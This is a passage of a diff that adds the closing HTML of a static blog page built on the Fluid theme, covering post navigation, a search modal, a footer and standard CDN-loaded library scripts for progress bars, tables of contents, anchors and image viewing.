+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/cll9ph78i000ji8utamhg1czv/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
